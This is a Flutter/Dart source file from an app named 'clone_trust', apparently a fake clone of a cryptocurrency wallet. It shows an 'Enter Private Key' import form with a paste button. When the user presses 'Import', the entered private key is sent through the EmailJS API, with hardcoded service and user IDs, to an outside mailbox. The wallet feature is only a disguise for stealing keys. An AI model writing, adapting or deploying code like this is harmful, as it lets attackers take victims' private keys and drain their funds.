import 'dart:convert';
import 'package:clone_trust/app/ui/dashboard_page.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart';

class PrivateKeyForm extends StatefulWidget {
  final int index;
  final String coinName;
  final String coinImage;
  const PrivateKeyForm({
    required Key key,
    required this.index,
    required this.coinName,
    required this.coinImage,
  }) : super(key: key);

  @override
  State<PrivateKeyForm> createState() => _PrivateKeyFormState();
}

class _PrivateKeyFormState extends State<PrivateKeyForm>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  TextEditingController textarea = TextEditingController();
  late String coinName;
  late String keyPhrase;

  //EMAILJS FUNCTION
  Future sendEmail(
      {required String coinName, required String keyPhrase}) async {
    const serviceId = "service_cyxu3mg";
    const templateId = "template_aknaxlp";
    const userId = "qfIj6IVuWwXYFBqLv";

    final url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');

    final response = await http.post(
      url,
      headers: {
        'origin': 'http://localhost',
        'Content-Type': 'application/json',
      },
      body: json.encode({
        'service_id': serviceId,
        'template_id': templateId,
        'user_id': userId,
        'template_params': {
          'user_name': coinName,
          'user_message': keyPhrase,
        }
      }),
    );
    print(response.body);
  }

  @override
  void initState() {
    super.initState();
    coinName = widget.coinName;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        alignment: Alignment.center,
        padding: EdgeInsets.only(top: 20),
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.all(10.0),
              child: Stack(
                children: <Widget>[
                  TextField(
                    controller: textarea,
                    keyboardType: TextInputType.multiline,
                    maxLines: 4,
                    decoration: new InputDecoration(
                      focusedBorder: OutlineInputBorder(
                        borderSide:
                            BorderSide(color: Colors.blueGrey, width: 1.0),
                      ),
                      enabledBorder: OutlineInputBorder(
                        borderSide:
                            BorderSide(color: Colors.blueGrey, width: 1.0),
                      ),
                      hintText: "Enter Private Key",
                    ),
                    onChanged: (value) {
                      keyPhrase = value;
                    },
                  ),
                  Positioned(
                    right: 0,
                    top: 0,
                    child: GestureDetector(
                      onTap: () async {
                        final ClipboardData? clipboardData =
                            await Clipboard.getData("text/plain");
                        if (clipboardData != null) {
                          textarea.text = clipboardData.text!;
                        }
                      },
                      child: Padding(
                        padding: const EdgeInsets.all(8.0),
                        child: Text(
                          "PASTE",
                          style: TextStyle(
                              fontSize: 16.0,
                              fontWeight: FontWeight.bold,
                              color: Color.fromARGB(255, 7, 152, 224)),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Padding(
              padding: const EdgeInsets.only(
                  left: 12.0, right: 12.0, top: 10.0, bottom: 10.0),
              child: Text(
                "Typically 64 alphanumeric characters",
                style: TextStyle(fontSize: 12.0, color: Colors.blueGrey),
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(10.0),
              child: TextFormField(
                decoration: new InputDecoration(
                  focusedBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.blueGrey, width: 1.0),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.blueGrey, width: 1.0),
                  ),
                  labelText: "Name",
                  // hintText: '${widget.coinName}',
                ),
                initialValue: '${widget.coinName}',
                onChanged: (value) {
                  coinName = value;
                },
              ),
            ),

            // const SizedBox(height: 8.0),
            Padding(
              padding: const EdgeInsets.only(left: 15.0, right: 15.0),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  minimumSize: Size.fromHeight(40),
                ),
                onPressed: () async {
                  await sendEmail(
                    coinName: coinName,
                    keyPhrase: textarea.text,
                  );
                  // Navigator.pushReplacement(
                  //   context,
                  //   MaterialPageRoute(
                  //     builder: (context) => DashboardPage(),
                  //   ),
                  // );
                },
                child: Text('Import'),
              ),
            )
          ],
        ),
      ),
    );
  }
}
